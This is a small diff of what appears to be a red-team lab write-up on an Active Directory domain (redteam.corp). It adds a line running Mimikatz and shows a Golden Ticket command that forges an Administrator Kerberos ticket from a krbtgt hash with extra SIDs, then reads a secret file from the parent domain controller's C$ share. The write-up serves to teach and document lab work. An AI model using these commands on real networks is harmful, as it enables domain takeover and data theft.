@@ -473,8 +473,9 @@ We gathered information about the domain
 We ran Mimikatz again and attempted a Golden Ticket attack using the information collected
 
 ```python
-
+.\mimikatz.exe
 ```
+
 ```python
 kerberos::golden /user:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902 /sids:S-1-5-21-1882140339-3759710628-635303199-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a /ptt
 ```
@@ -490,5 +491,6 @@ dir \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\
 ```python
 type \\RED-DC.redteam.corp\C$\Users\Administrator\Desktop\secret.xml
 ```
+
 
 ![[Pasted image 20250512212141.png]]
